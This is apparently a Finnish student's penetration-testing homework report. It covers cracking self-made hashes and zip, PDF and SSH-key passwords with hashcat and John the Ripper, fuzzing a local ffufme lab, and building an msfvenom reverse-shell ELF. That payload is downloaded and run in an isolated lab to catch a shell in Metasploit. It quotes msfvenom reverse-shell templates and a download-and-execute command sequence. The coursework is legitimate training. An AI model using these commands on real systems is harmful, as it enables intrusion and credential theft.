# [H4 Marraskuu2024!](https://terokarvinen.com/tunkeutumistestaus/#h4-marraskuu2024) (Karvinen 2024)

## x)  Lue/katso ja tiivistä.

### Cracking Passwords with Hashcat (Karvinen 2022)

- salasanat tallennettu tiivisteinä
  - tiivisteitä testataan sanalistoja vastaan
- hashcatia asennettaessa kannattaa myös asentaa hashid
  - hashid auttaa selvittämään tiivisteen algoritmi
- hashcatin tavanomainen käyttö
  - `hashcat -m [algoritmin hashcat id] '[tiiviste]' [sanalista] -o [tiedostonimi outputille]`

### Crack File Password With John (Karvinen 2023)

- John the Ripperillä voidaan murtaa tiedostojen salauksia
- binääri täytyy itse kääntää lähdekoodista
- kloonaa git repo, tarkista ympäristö ja tee Makefile(./configure), käännä lähdekoodi (make, ks. Makefilestä oikeat komennot ja parametrit)
- johnin tavanomainen käyttö tiedoston salauksen purkamiseen
  - tiedostosta tiivste irti
    - `polku/john/run/zip2john [tiedosto] >[tiedosto].hash`
  - aja john
    - `polku/john/run/john [tiedosto].hash`

### Security Penetration Testing - The Art of Hacking Series LiveLessons: Lesson 6: Hacking User Credentials (Santos et al. 2017)

- helppo tapa saada käyttäjätunnuksia on napata niitä suojaamattomasta verkosta (esim. kahvilan wifi hotspot)
- murrettavia tunnuksia voi saada myös nmapin skripteillä, metasploit moduuleilla tai esim. yksinkertaisesti palvelimelta kysymällä
- johnin ja hashcatin käyttöä
- suojautuminen:
  - käyttäjä/kuluttaja: älä käytä samaa salasanaa, ota käyttöön MFA kun mahdollista, käytä pidempiä salasanoja, älä käytä sanakirjaa
  - organisaatiot: MFA-tuki, älä rajaa salasanojen pituutta liian lyhyeksi, pitää olla tietoinen hyvistä ja huonoista tiivistealgoritmeistä, salasanojen suolaus, sertifikaattiperusteinen autentikointi (public-key algoritmit)

### HackTricks: MSFVenom - CheatSheet (HackTricks 2024)

- perushomma
  - ``msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>``
- nodejs
  - ``msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)``
  - minulle on epäselvää, missä tilanteessa tätä voitaisiin hyödyntää?

## a) Asenna Hashcat ja testaa sen toiminta murtamalla esimerkkisalasana.

Kali virtuaalikoneella:

    sudo apt update
    sudo apt install hashcat hashid   # tullut Kalin mukana, mutta todentaa ohjelmien olevan uusimmat versiot

Hashcatia varten ladataan vielä sanalista. Käytetään `rockyou.txt`. Googlasin "rockyou" ja valitsin ensimmäisen osuman. Käytin `wget` komentoa terminaalissa.

![image](https://github.com/user-attachments/assets/b4e7cbc1-0c74-4c22-8c84-5f6c01344336)
> Kuva 1. Sanalistan lataaminen.

Luodaan esimerkkitiiviste (tarkastin komennon [täältä](https://askubuntu.com/a/53852) (guntbert 2015)) ja identifioidaan käytettyä tiivistealgoritmi.

![image](https://github.com/user-attachments/assets/68065b15-1e4c-41eb-a77a-66845c8e9db7)
> Kuva 2. Testasin ettei lainausmerkit vaikuta tulosteeseen.

![image](https://github.com/user-attachments/assets/f9f16d9b-d0ff-4b19-b74f-5e92bdec9b30)
> Kuva 3. Md5 löytyy top 3:sta.

Ajoin kuvan 3 komennon toistamiseen lipulla `-m`, joka näyttää algoritmin hashcat moden numeron (`man hashid`).

`MD5 [Hashcat Mode: 0]`

![image](https://github.com/user-attachments/assets/df968a07-7ae5-4565-a233-670104e00a1b)
> Kuva 6. Murtaminen alkaa.

![image](https://github.com/user-attachments/assets/831f5c02-5d2e-4c0b-9b87-2ec9ad758622)
> Kuva 5. Muisti loppuu kesken.

Sammutetaan kone ja lisätään boxiin lisää muistia (2048 MB -> 4096 MB).

![image](https://github.com/user-attachments/assets/0b9cc91a-be05-403a-9415-65e2150adc99)
> Kuva 6. Valitun koneen muistin lisääminen. Oikea valikko aukeaa painamalla 'Settings' painiketta ja navigoimalla 'System' näkymään.

Käynnistetään kone uudelleen ja kokeillaan kuvassa 6 näkyvää komentoa uudestaan. Uuden terminaalin avaamisen (Left Ctrl + Alt + T) voi painaa pari kertaa nuolinäppäintä ylös, jotta saadaan täsmälleen sama käytetty komento uudelleen.

![image](https://github.com/user-attachments/assets/82f5132c-f931-4344-9e5a-7831d5a5a55b)
> Kuva 7. Cracked!

![image](https://github.com/user-attachments/assets/4f45ab65-90b0-4950-a6e6-0281c9c007de)
> Kuva 8. Data tallessa tiedostossa.

## b) Asenna John the Ripper ja testaa sen toiminta murtamalla jonkin esimerkkitiedoston salasana.

Tarkistin komennot samasta Teron artikkelista, josta kohdassa x) tehtiin lyhyt tiivistelmä (Karvinen 2023).

    git clone --depth=1 https://github.com/openwall/john.git
    cd john/src/	
    ./configure

![image](https://github.com/user-attachments/assets/b0581dc6-1c7e-4568-b477-d976f4c4b01b)
> Kuva 9. Eka `./configure`.

Ensimmäinen konfigurointi (eli ympäristön/kirjastojen tarkistus) päättyi virheilmoitukseen openssl:n puuttumisesta. En ymmärtänyt oikean paketin nimen olevan `libssl-dev`. Löysin apua [täältä](https://stackoverflow.com/a/34818789) (Kilzer 2018).

    sudo apt-get update
    sudo apt-get install libssl-dev
    ./configure

Toisella `./configure` ajolla koodin todetaan olevan ok käännettäväksi. Mutta kaikkia Johnin toimintoja ei ole käytössä puuttuvien kirjastojen takia (ks. kuva alla).

![image](https://github.com/user-attachments/assets/4715e42e-49d2-4f29-ad6f-17b4a2b20823)
> Kuva 10. Toka `./configure`.

Kuvan 10 tuloste kehottaa seuraavaksi ajamaan `make` komennon kahdesti eri argumentein. Käytän Teron ohjeen (Karvinen 2023) mukaan `-sj2` tilalla `-sj4`.

    make -s clean && make -sj4

![image](https://github.com/user-attachments/assets/4b46f92b-b176-44c2-80a4-e7ec3beb4951)
> Kuva 11. Käännetty.

Kokeillaan onko John the Ripper asennettu.

    cd ../run
    john

![image](https://github.com/user-attachments/assets/ac2acbdd-b88d-44c1-97e2-8ab3d6eded01)
> Kuva 12. John juoksee.

Seuraavaksi itse asiaan, tiedoston salasanan murtamiseen. Luodaan ensiksi salasanasuojattu zip-tiedosto.

![image](https://github.com/user-attachments/assets/cfd6f406-6b5c-45ad-a9b7-6bb5fc2ddd88)
> Kuva 13. `zip -h2 | less` Less lukuohjelmassa syöte "/password".

![image](https://github.com/user-attachments/assets/96cc432a-1dd6-40b4-8e95-947e30f57134)
> Kuva 14. Zipping.

![image](https://github.com/user-attachments/assets/8364a908-01b1-4ce6-b8cb-4075cae8e9b0)
> Kuva 15. Ote historiasta. Manuaalia tutkimalla oikea komento ei ihan heti löytynyt.

Nyt on kotihakemistoon luotu loot.zip. Kokeillaan purkaa se ja katsotaan mitä tapahtuu väärällä salasanalla tai kysytäänkö sitä ollenkaan.

![image](https://github.com/user-attachments/assets/485b62a9-8f13-4180-a114-302ad80b3821)
> Kuva 16. Salasanaa kysytään ja annetaan se väärin.

Näyttää siltä, että hakemiston jokainen tiedosto on suojattu salasanalla. Kokeillaan murtaa se Johnilla.

    cd ~/john/run
    zip2john ~/loot.zip > ~/loot.zip.hash    # tarkistettu artikkelista (Karvinen 2023)
    john ~/loot.zip.hash

Tiivisteen erottamisessa john osaa oikein päätellä/olettaa, että salasana on sama joka tiedostossa.

![image](https://github.com/user-attachments/assets/6c0260a7-adee-491c-b22e-5495a0f30684)
> Kuva 17. Murrettu! Salasana: data.

![image](https://github.com/user-attachments/assets/a18aa86b-6282-4ad9-b442-9398f71e4ab4)
> Kuva 18. Salasanan syöttäminen purkaa zip-tiedoston.

## c) Fuffme. Asenna Ffufme harjoitusmaali paikallisesti omalle koneellesi. Ratkaise tehtävät (kaikki paitsi ei "Content Discovery - Pipes")

### Asennukset

Seurataan Teron ohjeita harjoitusmaalin ja muiden vaatimusten asentamiseksi (Karvinen 2023b).

    sudo apt-get install docker.io
    git clone https://github.com/adamtlangley/ffufme
    cd ffufme/
    sudo docker build -t ffufme .
    sudo docker run -d -p 80:80 ffufme

![image](https://github.com/user-attachments/assets/3e140e1d-4375-41bf-841b-157b9347e741)
> Kuva 19. Target acquired.

Asennetaan vielä lisää sanalistoja. Ohjeissa mainittu `common.txt` löytyy jo.

![image](https://github.com/user-attachments/assets/1840710e-a294-4bea-8014-a7b765450ea9)
> Kuva 20. Sanalistat haettu.

Otetaan kone irti internetistä varmuuden vuoksi.

![image](https://github.com/user-attachments/assets/d6d79779-7dfe-4c80-a116-7cb25da0b7f2)
> Kuva 21. NATattu liitin pois päältä. Kohde vielä pystyssä.

### Basic Content Discovery

Kalin Z shell ystävällisesti näytti edellisen käytetyn `ffuf` komennon, josta oli helppo muuttaa url-argumentti. Eka ajo meni kuitenkin pieleen, kun en spesifioinut käytettävää protokollaa (http://).

![image](https://github.com/user-attachments/assets/4190fee7-fe73-4005-aabc-82ace3ae7ff8)
> Kuva 22. Basic Content Discovery suoritettu.

### Content Discovery With Recursion

Lippu `-recursion` fuzzaa löydetyn hakemiston.

![image](https://github.com/user-attachments/assets/4a39cb26-09c2-43ff-9c48-beea41cead28)
> Kuva 23. Rekursiivisesti.

### Content Discovery With File Extensions

![image](https://github.com/user-attachments/assets/55c62520-5946-466a-b952-626c1c4656ef)
> Kuva 24. Tiedostopäätteen kera.

### No 404 Status

Tämähän oli jo tuttu. Filteröidään koon mukaan tulokset.

![image](https://github.com/user-attachments/assets/dfdc38a9-e3fe-4f8e-ba01-4281e99e17b6)
> Kuva 25. Salaisuus löytyi.

### Param Mining

Sijoitetaan avainsana url-parametrin tilalle.

![image](https://github.com/user-attachments/assets/7e45dc19-8eeb-45f4-acf2-e9ad2ac4d960)
> Kuva 26. Paramteri löydetty.

### Rate Limited

![image](https://github.com/user-attachments/assets/12e389d3-7422-48c1-8d84-7bba8fcbb05b)
> Kuva 27. Pieni paussi pyynnöissä.

Tämä kohta herätti hieman kysymyksiä. Tauon asettamisen ymmärrän. Mutta mitä tekee `-t`, joka manuaalisivujen mukaan avaa useamman threadin eli mitä ovat threadit?

### Subdomains - Virtual Host Enumeration

![image](https://github.com/user-attachments/assets/558bacc3-b1fd-4d43-b8eb-2b7bd91bcca8)
> Kuva 28. Subdomain löydetty.

![image](https://github.com/user-attachments/assets/bf5d9df6-9b28-478b-b7ec-2cd571f06ab3)
> Kuva 29. Mitähän ne subdomainit olikaan? Lähde: https://en.wikipedia.org/wiki/Subdomain

## d) Tiedosto. Tee itse tai etsi verkosta jokin salakirjoitettu tiedosto, jonka saat auki. Murra sen salaus. (Jokin muu formaatti kuin aiemmissa alakohdissa kokeilemasi).

Aloitin listaamalla `~/john/run/` sisällön selvittääkseni formaatin, jonka voisin murtaa. Valitsin pdf:n (pdf2john). Minun piti selvittää, miten pdf salataan. [Tästä](https://security.stackexchange.com/a/183560) vastauksesta (Arminius 2018) sain selville ohjelman `qpdf` ja parametrit kryptaamiseen.

    sudo apt-get install qpdf

Luodaan uusi pdf.

    qpdf -empty -- crack.pdf  # man qpdf

Aiemmin linkkaamastani ohjeesta (Arminius 2018) komento kryptattavan pdf:n tekemiseen.

    qpdf --encrypt 123456 123456 256 crack.pdf crack_crypted.pdf

![image](https://github.com/user-attachments/assets/efb57b17-7dc0-4079-aa35-7256f0ff5ed5)
> Kuva 30. Salasanasuojattu pdf.

Tämän jälkeen otetaan tiiviste talteen kuten kohdassa b) mutta tällä kertaa eri johnin moduulilla.

![image](https://github.com/user-attachments/assets/51ded7ab-4885-4e99-8531-e10367f73847)
> Kuva 31. Tiivisteen talteenotto.

![image](https://github.com/user-attachments/assets/6f00a0bb-ebd6-4fe8-8d63-6b6ce59fd21f)
> Kuva 32. Tiiviste vuotaa.

John onnistui. Hyvä John!

## e) Tiiviste. Tee itse tai etsi verkosta salasanan tiiviste, jonka saat auki. Murra sen salaus. (Jokin muu formaatti kuin aiemmissa alakohdissa kokeilemasi. Voit esim. tehdä käyttäjän Linuxiin ja murtaa sen salasanan.)

Kokeillaan avata salasanasuojattu yksityinen ssh-avain. Harjoitan näiden salausavainten kanssa erityistä varovaisuutta. Kannattaa huomioida, ettei ylikirjoita olemassa olevia avaimia. Sijoitan uuden avainparin erilleen olemassa olevista avaimista ja lopuksi tulen vielä poistamaan avainparin.

![image](https://github.com/user-attachments/assets/b6ae2acb-c344-445a-a735-838e2f13d595)
> Kuva 33. Avainparin luominen.

Let's get cracking!

![image](https://github.com/user-attachments/assets/cc18040e-4b5d-4ce0-aa4a-aa8b1a4d5586)
> Kuva 34. John käy.

Pysäytin ensimmäisen ajon n. 30min käynnistyksestä. Kuvasssa 34 ajon aikainen status näyttää, että john yrittää murtaa salasanaa tunnistamansa kontekstin perusteella; käyttäjänimen, tiedostopolun yms. muokkauksella. Tässä kohtaa, jotta saan salasanan murrettua ja tehtävän mielekkääseen tilaan palautusta varten, tutustun johnin manuaalisivuista oppimaani incremental modeen (salasanan lisääminen sanalistaan ei tunnu kivalta vaihtoehdolta).

John the Ripperin [dokumentaatiosta](https://www.openwall.com/john/doc/MODES.shtml) (Openwall a): *"As of version 1.8.0, pre-defined incremental modes are --"LowerNum" (lowercase letters plus digits, for 36 total)"*.

![image](https://github.com/user-attachments/assets/229a9dba-ab86-4963-a40b-b755b1858d1f)
> Kuva 35. ETA: 2030.

Vaikka määritin max ja min length arvot salasanan pituudeksi (`sudo micro /etc/jonh/john.config` + `CTRL + F -> LowerNum`) on kombinaatioiden määrä 36:lla merkillä niin suuri, etten pysty tällä tavoin murtamaan salasanaa. Manuaalisivuilla sanotaan, että `-rules` parametriä täytyy käyttää `-wordlist` parametrin yhteydessä. Muutetaan salasanaa ja kokeillaan muuttaa a -> 4, s -> 5, i -> 1 jne. ja käytetään rockyou.txt sanalistana.

    rm ~/mock.ssh/*  # poistetaan avaimet
    ssh-keygen       #  uudet avaimet ja uusi salasana

Sääntöjen kirjoituksen ohjeet (Openwall b ja Singer 2021).

    sudo micro /etc/john/john.conf

![image](https://github.com/user-attachments/assets/91c3c262-1088-4794-9b55-331b7ba6e7c4)
> Kuva 36. Säännön kirjoitus conf-tiedoston loppuun.

![image](https://github.com/user-attachments/assets/08caea8c-0339-4eb8-8439-24584828384c)
> Kuva 37. Johnin ajo sanalistan ja oman säännön kanssa.

Hyvä John!

Poistetaan vielä avaimet, ettei niitä vahingossa käytetä.

## f) Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.

En ihan ymmärtänyt, että mitä pitää tehdä tässä tehtävässä. Löysin YouTubesta [tämän](https://www.youtube.com/watch?v=ZqWfDrD2WVY) videon (Cyber Offense 2022), jossa luodaan msfvenomilla haittaohjelma ja simuloidaan sen jakaminen web-palvelimelta kohteeseen ja napataan reverse shell käyttöön kohteen ajettua tiedosto. Videon katsottuani arvelin, että onnistun riittävällä tasolla simuloimaan hyökkäyksen etenemisen yhdellä koneella.

Ohjelman teko mukailtu MsfVenom cheatsheetistä (HackTricks 2024).

![image](https://github.com/user-attachments/assets/74099e99-dd29-4ddc-9e54-c03ab38bc5f7)
> Kuva 38. Haittaohjelman luominen.

![image](https://github.com/user-attachments/assets/8715234f-5ef0-4146-a032-b1125e52af70)
> Kuva 39. Web-palvelin päälle.

Tässä vaiheessa varmistus, ettei labra saa yhteyttä internetiin (`sudo ifconfig eth0 down`).

![image](https://github.com/user-attachments/assets/57dc586e-881c-4078-9d9c-3c05d41ee1fe)
> Kuva 40. Ei varmana vuoda paketteja.

Käynnistetään multi handler msfconsolessa (Cyber Offense 2022).

![image](https://github.com/user-attachments/assets/6739f190-08a0-48a0-a53a-b5d81903e6a8)
> Kuva 41. Multi handler päälle ja payloadin valinta.

Tämän jälkeen määritetään haittaohjelmaan kirjoitetut parametrit eli ne tiedot, ip ja portti, joihin haittaohjelma yrittää muodostaa yhteden ja avata reverse shellin.

    set LHOST [haittaohjelmaan kirjoitettu ip]
    set LPORT [haittaohjelmaan kirjoitettu portti]
    exploit

Nyt kuuntelu on käynnissä ja hyökkäjä on valmis vastaanottamaan haittaohjelman suorittajan koneeseen yhteyspyynnön ja shellin.

Ajetaan haittaohjelma. Kuvaan kohdetta yksinkertaisesti siirtymällä uuteen hakemistoon ja lataamaan web-palvelimen kautta tiedoston. Tämän jälkeen annetaan ajo-oikeudet tiedostoon ja se suoritetaan.

    mkdir fish    # kuvaa käyttäjän konetta
    cd fish
    wget http://localhost:8000/bait.elf
    chmod u+x bait.elf
    ./bait.elf

Miltäs näyttää msfconsolessa?

![image](https://github.com/user-attachments/assets/4c191b39-0e09-4935-a617-0a45e8b26464)
> Kuva 42. Kohde hallinnassa.

## Lähteet

Arminius, 2018. Why won't pdf2john extract the password hash of this encrypted pdf? Getting blank results. Answers. Luettavissa: https://security.stackexchange.com/a/183560 Luettu: 2024-11-17

Cyber Offense, 2022. Use Msfvenom to Create a Reverse TCP Payload. Katsottavissa: https://www.youtube.com/watch?v=ZqWfDrD2WVY Katsottu: 2024-11-19

guntbert, 2015. How to get the MD5 hash of a string directly in the terminal? Answers. Luettavissa: https://askubuntu.com/questions/53846/how-to-get-the-md5-hash-of-a-string-directly-in-the-terminal Luettu: 2024-11-16

HackTricks, 2024. MSFVenom - CheatSheet. Luettavissa: https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom Luettu: 2024-11-15

Karvinen, T. 2022. Cracking Passwords with Hashcat. Luettavissa: https://terokarvinen.com/2022/cracking-passwords-with-hashcat/ Luettu: 2024-11-15

Karvinen, T. 2023a. Crack File Password With John. Luettavissa: https://terokarvinen.com/2023/crack-file-password-with-john/ Luettu: 2024-11-15

Karvinen, T. 2023b. Fuffme - Install Web Fuzzing Target on Debian. Luettavissa: https://terokarvinen.com/2023/fuffme-web-fuzzing-target-debian/ Luettu: 2024-11-17

Karvinen, T. 2024. Tunkeutumistestaus. H4 Marraskuu!. Luettavissa: https://terokarvinen.com/tunkeutumistestaus/#h4-marraskuu2024 Luettu: 2024-11-15

Kilzer, A. 2018. OpenSSL headers missing when building OpenSSH. Answers. Luettavissa: https://stackoverflow.com/questions/30330835/openssl-headers-missing-when-building-openssh/34818789#34818789 Luettu: 2024-11-17

Openwall, a. "Incremental" mode. Luettavissa: https://www.openwall.com/john/doc/MODES.shtml Luettu: 2024-11-19

Openwall, b. Wordlist Rules Syntax. Character class commands. Luettavissa: https://www.openwall.com/john/doc/RULES.shtml Luettu: 2024-11-19

Santos, O., Sternstein, J., Taylor, R., McCoy, C. 2017. Security Penetration Testing The Art of Hacking Series LiveLessons. Katsottavissa (vaatii kirjautumisen): https://learning.oreilly.com/course/security-penetration-testing/9780134833989/ Katsottu: 2024-11-16

Singer, N. 2021. John-The-Ripper Password Cracking: Rule Creation. Katsottavissa: https://www.youtube.com/watch?v=Jz22sRSZZOc Katsottu: 2024-11-19
